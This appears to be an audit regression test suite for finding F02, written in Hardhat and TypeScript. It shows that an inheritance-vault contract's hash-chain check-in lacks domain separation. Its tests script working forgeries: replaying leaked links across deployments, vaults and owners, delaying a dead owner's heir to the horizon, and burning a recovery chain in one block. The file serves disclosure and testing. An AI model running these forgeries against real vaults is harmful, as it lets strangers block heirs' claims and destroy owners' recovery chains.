// v1 evidence suite (audit/2026-09-preliminary). Ported from the audit PoC sandbox poc/F02/test/poc-F02.ts.
// Contract under test: contracts/v1/InheritanceVaultV1.sol (the deployed v1 source, renamed). See ../README.md.
/**
 * PoC / regression test for audit finding F02:
 *   the S/KEY check-in chain has no domain separation, so a link revealed in one context
 *   (another deployment, another vault, another owner, an earlier installation) lets an
 *   unprivileged third party forge check-ins in another context.
 *
 * Every `it` asserts the SAFE property. Against the current contract they FAIL because a
 * third party's forged check-in is accepted.
 *
 * Chain derivation lives in exactly two helpers, `chainTip` and `step`. Today the contract
 * accepts `keccak256(abi.encodePacked(preimage)) == hbAnchor`, so `step` ignores its context
 * and `chainTip` returns the raw seed (the repo's own convention, test/InheritanceVault.ts
 * makeChain). A fix that domain-separates the step (chainid, vault address, owner, vaultId,
 * install epoch) must update `step`; a fix to the reference generator (tip = KDF(seed, ctx))
 * must update `chainTip`. Nothing else in this file needs to change.
 */
import { expect } from "chai";
import { ethers, network } from "hardhat";
import { loadFixture, time } from "@nomicfoundation/hardhat-network-helpers";

const DAY = 86_400;
const HOUR = 3_600;
const PERIOD = 30 * DAY;
const WINDOW = 14 * DAY;
const NATIVE = ethers.ZeroAddress;
const DEPOSIT = ethers.parseEther("10");
const FEE_BPS = 50;

type Ctx = { chainId: bigint; vault: string; owner: string; vaultId: number; epoch: number };

// Evidence-suite port: pinned to v1. The sandbox's F02_FIXED switch ran these assertions against a
// fix sketch (InheritanceVaultDomainSep.sol) that is not carried over; the v2 regression tests replace
// it. chainTip and step below are the v1 derivation only.
const CONTRACT = "InheritanceVaultV1";

/** The chain's base value for a context. v1 convention: the paper seed itself. */
function chainTip(_ctx: Ctx, seed: string): string {
  return seed;
}

/** One hash step, exactly as the v1 contract verifies it: plain keccak256, no context. */
function step(_ctx: Ctx, x: string): string {
  return ethers.keccak256(x);
}

function walk(ctx: Ctx, x: string, n: number): string {
  for (let i = 0; i < n; i++) x = step(ctx, x);
  return x;
}

/** link(ctx, seed, k) = step^k(chainTip(ctx, seed)); the anchor of an n-use chain is link(n). */
function link(ctx: Ctx, seed: string, k: number): string {
  return walk(ctx, chainTip(ctx, seed), k);
}

describe("F02 hash-chain check-in has no domain separation", () => {
  // Evidence-suite port: start from a fresh chain, as this PoC did alone in its audit sandbox. In the
  // combined audit:v1 run, earlier files leave state behind (nonces, balances, deployments, block time).
  before(async () => {
    await (await import("@nomicfoundation/hardhat-network-helpers")).reset();
  });

  async function fixture() {
    const [admin, alice, bob, carol, dave, feeSink] = await ethers.getSigners();
    const Vault = await ethers.getContractFactory(CONTRACT, admin);
    // Two independent deployments of the same bytecode: "rehearsal" (testnet / other chain)
    // and "real" (mainnet). Both live on one Hardhat chain, so only the address differs.
    const rehearsal = await Vault.deploy(admin.address, FEE_BPS, feeSink.address);
    const real = await Vault.deploy(admin.address, FEE_BPS, feeSink.address);
    const chainId = (await ethers.provider.getNetwork()).chainId;
    // Fixed seed so failures are reproducible; any 32 bytes behave the same.
    const seed = ethers.keccak256(ethers.toUtf8Bytes("alice paper seed (test only)"));
    return { rehearsal, real, admin, alice, bob, carol, dave, feeSink, chainId, seed };
  }

  async function openVault(vault: any, owner: any, heir: string, horizonSecs = 730 * DAY) {
    const horizon = (await time.latest()) + horizonSecs;
    await vault.connect(owner).createVault(NATIVE, DEPOSIT, heir, PERIOD, WINDOW, horizon, { value: DEPOSIT });
    const id = Number(await vault.vaultCount(owner.address)) - 1;
    return { id, horizon };
  }

  async function ctxOf(f: any, vault: any, owner: any, vaultId: number, epoch = 1): Promise<Ctx> {
    return { chainId: f.chainId, vault: await vault.getAddress(), owner: owner.address, vaultId, epoch };
  }

  /** Alice rehearses on the other deployment: 10-use chain, two check-ins -> links 9 and 8 in public calldata. */
  async function rehearse(f: any) {
    const { id } = await openVault(f.rehearsal, f.alice, f.bob.address);
    const ctxA = await ctxOf(f, f.rehearsal, f.alice, id);
    await f.rehearsal.connect(f.alice).setCheckInChain(id, link(ctxA, f.seed, 10), 10);
    await time.increase(DAY);
    await f.rehearsal.connect(f.alice).checkInByChain(f.alice.address, id, link(ctxA, f.seed, 9));
    await time.increase(DAY);
    await f.rehearsal.connect(f.alice).checkInByChain(f.alice.address, id, link(ctxA, f.seed, 8));
    // What an observer reads from calldata of that last transaction:
    return { leaked: link(ctxA, f.seed, 8), leakedDepth: 8 };
  }

  // ------------------------------------------------------------------ (a) cross-deployment

  it("(a) a link revealed on another deployment cannot be turned into a check-in on this one", async () => {
    const f = await loadFixture(fixture);
    const { leaked, leakedDepth } = await rehearse(f);

    const N = 1000;
    const { id } = await openVault(f.real, f.alice, f.bob.address);
    const ctxB = await ctxOf(f, f.real, f.alice, id);
    await f.real.connect(f.alice).setCheckInChain(id, link(ctxB, f.seed, N), N);
    const d0 = (await f.real.getVault(f.alice.address, id)).deadline;

    // Alice dies. Dave (no key, no seed) hashes the leaked value forward with the real
    // deployment's public step function and submits it an hour before the deadline.
    await time.increaseTo(Number(d0) - HOUR);
    const forged = walk(ctxB, leaked, N - 1 - leakedDepth);
    await expect(
      f.real.connect(f.dave).checkInByChain(f.alice.address, id, forged),
      "a stranger forged a check-in on the real vault from a link leaked on another deployment"
    ).to.be.reverted;
  });

  // ------------------------------------------------------------------ (c) cross-vault / cross-owner

  it("(c1) a link revealed on one of the owner's vaults is not accepted on another of her vaults", async () => {
    const f = await loadFixture(fixture);
    const v0 = await openVault(f.real, f.alice, f.bob.address);
    const v1 = await openVault(f.real, f.alice, f.carol.address); // split estate, second heir
    const ctx0 = await ctxOf(f, f.real, f.alice, v0.id);
    const ctx1 = await ctxOf(f, f.real, f.alice, v1.id);
    await f.real.connect(f.alice).setCheckInChain(v0.id, link(ctx0, f.seed, 5), 5);
    await f.real.connect(f.alice).setCheckInChain(v1.id, link(ctx1, f.seed, 5), 5);

    // Alice (or her relayer) keeps vault 0 alive: link 4 is now public.
    await time.increase(DAY);
    await f.real.connect(f.alice).checkInByChain(f.alice.address, v0.id, link(ctx0, f.seed, 4));

    // Dave replays the same bytes against vault 1.
    await expect(
      f.real.connect(f.dave).checkInByChain(f.alice.address, v1.id, link(ctx0, f.seed, 4)),
      "a link revealed on vault 0 was accepted on vault 1 from a stranger's account"
    ).to.be.reverted;
  });

  it("(c2) a link revealed on one owner's vault is not accepted on a different owner's vault", async () => {
    const f = await loadFixture(fixture);
    // A family shares one printed seed.
    const va = await openVault(f.real, f.alice, f.bob.address);
    const vc = await openVault(f.real, f.carol, f.bob.address);
    const ctxA = await ctxOf(f, f.real, f.alice, va.id);
    const ctxC = await ctxOf(f, f.real, f.carol, vc.id);
    await f.real.connect(f.alice).setCheckInChain(va.id, link(ctxA, f.seed, 5), 5);
    await f.real.connect(f.carol).setCheckInChain(vc.id, link(ctxC, f.seed, 5), 5);

    await time.increase(DAY);
    await f.real.connect(f.alice).checkInByChain(f.alice.address, va.id, link(ctxA, f.seed, 4));

    await expect(
      f.real.connect(f.dave).checkInByChain(f.carol.address, vc.id, link(ctxA, f.seed, 4)),
      "a link revealed on Alice's vault was accepted on Carol's vault"
    ).to.be.reverted;
  });

  // ------------------------------------------------------------------ re-installation

  it("(re-install) re-arming a vault from the same seed does not make its already-revealed links valid again", async () => {
    const f = await loadFixture(fixture);
    const { id } = await openVault(f.real, f.alice, f.bob.address);
    const e1 = await ctxOf(f, f.real, f.alice, id, 1);
    await f.real.connect(f.alice).setCheckInChain(id, link(e1, f.seed, 3), 3);
    await time.increase(DAY);
    await f.real.connect(f.alice).checkInByChain(f.alice.address, id, link(e1, f.seed, 2));
    await time.increase(DAY);
    await f.real.connect(f.alice).checkInByChain(f.alice.address, id, link(e1, f.seed, 1));

    // Alice "refills the counter" from the same paper seed (a second installation, epoch 2).
    const e2 = await ctxOf(f, f.real, f.alice, id, 2);
    await f.real.connect(f.alice).setCheckInChain(id, link(e2, f.seed, 3), 3);

    // Dave replays link 2 exactly as it appeared in Alice's earlier calldata.
    await expect(
      f.real.connect(f.dave).checkInByChain(f.alice.address, id, link(e1, f.seed, 2)),
      "a link already consumed by this vault was accepted again after re-installation"
    ).to.be.reverted;
  });

  // ------------------------------------------------------------------ (b) exhaustion then re-arm

  it("(b) after a chain is exhausted, a re-armed chain from the same seed is not forgeable from the final reveal", async () => {
    const f = await loadFixture(fixture);
    const { id } = await openVault(f.real, f.alice, f.bob.address);
    const e1 = await ctxOf(f, f.real, f.alice, id, 1);
    await f.real.connect(f.alice).setCheckInChain(id, link(e1, f.seed, 3), 3);
    for (const k of [2, 1, 0]) {
      await time.increase(DAY);
      await f.real.connect(f.alice).checkInByChain(f.alice.address, id, link(e1, f.seed, k));
    }
    // The last preimage (link 0) is now in calldata and in hbAnchor via getVault.
    const lastReveal = (await f.real.getVault(f.alice.address, id)).hbAnchor;
    console.log(`      [b] final reveal == raw paper seed: ${lastReveal === f.seed}`);

    const e2 = await ctxOf(f, f.real, f.alice, id, 2);
    await f.real.connect(f.alice).setCheckInChain(id, link(e2, f.seed, 500), 500);

    // Dave derives a valid next link for the NEW installation from the public final reveal.
    // Knowing only lastReveal, Dave tries the re-armed context's step from it.
    const forged = walk(e2, lastReveal, 499);
    await expect(
      f.real.connect(f.dave).checkInByChain(f.alice.address, id, forged),
      "the re-armed chain was forged from the value revealed by the previous chain's last step"
    ).to.be.reverted;
  });

  // ------------------------------------------------------------------ damage: inheritance delayed to the horizon

  it("damage: a stranger holding a leaked link cannot move a dead owner's deadline (heir delayed to the horizon)", async () => {
    const f = await loadFixture(fixture);
    const { leaked, leakedDepth } = await rehearse(f);

    const N = 1000;
    const { id, horizon } = await openVault(f.real, f.alice, f.bob.address, 730 * DAY);
    const ctxB = await ctxOf(f, f.real, f.alice, id);
    await f.real.connect(f.alice).setCheckInChain(id, link(ctxB, f.seed, N), N);
    const d0 = (await f.real.getVault(f.alice.address, id)).deadline; // Alice's last real act; she then dies

    let accepted = 0;
    let depth = N - 1;
    for (;;) {
      const d = (await f.real.getVault(f.alice.address, id)).deadline;
      if (d >= BigInt(horizon)) break;
      await time.increaseTo(Number(d) - HOUR);
      try {
        const forged = walk(ctxB, leaked, depth - leakedDepth);
        await (await f.real.connect(f.dave).checkInByChain(f.alice.address, id, forged)).wait();
        accepted += 1;
        depth -= 1;
      } catch {
        break; // a fixed contract refuses the forgery
      }
    }
    const v = await f.real.getVault(f.alice.address, id);
    const delayDays = Number(v.deadline - d0) / DAY;
    console.log(
      `      [damage] forged check-ins accepted: ${accepted}; deadline moved ${delayDays.toFixed(1)} days ` +
        `(from ${d0} to ${v.deadline}); horizon ${horizon}; deadline == horizon: ${v.deadline === BigInt(horizon)}`
    );

    // Safe property: without Alice's key or unrevealed secret, nobody moves her deadline.
    expect(v.deadline, "a third party moved the dead owner's deadline").to.equal(d0);

    // And so the heir can claim one second after the owner's own deadline.
    await time.increaseTo(Number(d0) + 1);
    await expect(f.real.connect(f.bob).initiateClaim(f.alice.address, id, f.bob.address)).to.not.be.reverted;
  });

  // ------------------------------------------------------------------ (d) recovery chain burned in one block

  it("(d) a stranger cannot burn the owner's recovery chain", async () => {
    const f = await loadFixture(fixture);
    const { leaked, leakedDepth } = await rehearse(f);

    const N = 100;
    const { id } = await openVault(f.real, f.alice, f.bob.address);
    const ctxB = await ctxOf(f, f.real, f.alice, id);
    await f.real.connect(f.alice).setCheckInChain(id, link(ctxB, f.seed, N), N);
    const before = (await f.real.getVault(f.alice.address, id)).hbLeft;

    // Dave queues every link he can derive (N-1 down to the leaked depth) into ONE block.
    await network.provider.send("evm_setAutomine", [false]);
    const txs: any[] = [];
    try {
      for (let k = N - 1; k >= leakedDepth; k--) {
        const forged = walk(ctxB, leaked, k - leakedDepth);
        txs.push(
          await f.real.connect(f.dave).checkInByChain(f.alice.address, id, forged, { gasLimit: 150_000 })
        );
      }
      await network.provider.send("evm_mine", []);
    } finally {
      await network.provider.send("evm_setAutomine", [true]);
    }
    const receipts = await Promise.all(txs.map((t) => ethers.provider.getTransactionReceipt(t.hash)));
    const ok = receipts.filter((r) => r && r.status === 1).length;
    const blocks = new Set(receipts.map((r) => r && r.blockNumber));
    const after = (await f.real.getVault(f.alice.address, id)).hbLeft;
    console.log(
      `      [d] ${ok}/${txs.length} forged check-ins succeeded in ${blocks.size} block(s); hbLeft ${before} -> ${after}; ` +
        `Alice's next link ${N - 1} is now ${after < before ? "dead" : "still valid"}`
    );

    expect(after, "a stranger consumed the owner's recovery chain").to.equal(before);
  });
});
